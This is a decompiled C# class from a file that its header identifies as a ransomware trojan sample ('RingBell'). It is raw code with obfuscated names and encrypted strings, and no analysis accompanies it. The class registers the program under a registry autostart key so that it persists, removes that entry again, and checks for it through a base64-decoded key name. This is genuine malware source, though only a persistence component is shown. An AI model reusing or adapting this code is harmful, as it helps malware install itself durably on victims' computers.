// Decompiled with JetBrains decompiler
// Type:  
// Assembly: RingBell, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 126B6CA2-9E8E-4E8F-B66A-E8ED3E4C478A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Ransom.MSIL.Foreign.gen-8b786784c172c6f8b241b1286a2054294e8dc2c167d9b4daae0e310a1d923ba0.exe

using Microsoft.Win32;
using System;
using System.IO;
using System.Reflection;
using System.Text;
using System.Windows.Forms;

public sealed class \u0003\u2001
{
  public static bool \u0002() => \u0003\u2001.\u0002(Application.ProductName, Application.ExecutablePath);

  public static bool \u0002(string _param0, string _param1)
  {
    bool flag;
    try
    {
      Registry.CurrentUser.OpenSubKey(\u0005\u2001.\u0002, true).SetValue(_param0, (object) _param1);
    }
    catch (Exception ex1)
    {
      string path = Application.StartupPath + \u0008\u2001.\u0002(-2094346204);
      try
      {
        using (StreamWriter streamWriter = new StreamWriter(path))
        {
          string str = DateTime.Now.ToString(\u0008\u2001.\u0002(-2094346185)) + Environment.NewLine + ex1.Message + Environment.NewLine + ex1.StackTrace + Environment.NewLine + \u0008\u2001.\u0002(-2094346145) + Environment.NewLine;
          streamWriter.Write(str);
          streamWriter.Close();
          flag = false;
          goto label_7;
        }
      }
      catch (Exception ex2)
      {
        ex2.GetType();
        flag = false;
        goto label_7;
      }
    }
    flag = true;
label_7:
    return flag;
  }

  public static bool \u0003() => \u0003\u2001.\u0003(Application.ProductName, Application.ExecutablePath);

  public static bool \u0002(string _param0) => \u0003\u2001.\u0003(_param0, (string) null);

  public static bool \u0003(string _param0, string _param1)
  {
    bool flag;
    try
    {
      RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(\u0005\u2001.\u0002, true);
      if (_param1 == null)
        registryKey.DeleteValue(_param0);
      else if (registryKey.GetValue(_param0).ToString().ToLower() == _param1.ToLower())
        registryKey.DeleteValue(_param0);
      flag = true;
      goto label_12;
    }
    catch (Exception ex)
    {
    }
    try
    {
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(\u0005\u2001.\u0002, true);
      if (_param1 == null)
        registryKey.DeleteValue(_param0);
      else if (registryKey.GetValue(_param0).ToString().ToLower() == _param1.ToLower())
        registryKey.DeleteValue(_param0);
    }
    catch (Exception ex)
    {
      flag = false;
      goto label_12;
    }
    flag = true;
label_12:
    return flag;
  }

  public static bool \u0005() => \u0003\u2001.\u0005(Assembly.GetExecutingAssembly().GetName().Name, Application.ExecutablePath);

  public static bool \u0005(string _param0, string _param1)
  {
    bool flag;
    try
    {
      byte[] bytes = Convert.FromBase64String(\u0008\u2001.\u0002(-2094346143));
      Encoding.ASCII.GetString(bytes);
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Encoding.ASCII.GetString(bytes), true);
      if (registryKey == null)
      {
        flag = false;
        goto label_5;
      }
      else
      {
        string str = registryKey.GetValue(_param0) == null ? (string) null : registryKey.GetValue(_param0).ToString();
        flag = str != null && str.ToLower().Equals(_param1.ToLower());
        goto label_5;
      }
    }
    catch (Exception ex)
    {
      ex.GetType();
    }
    flag = false;
label_5:
    return flag;
  }
}
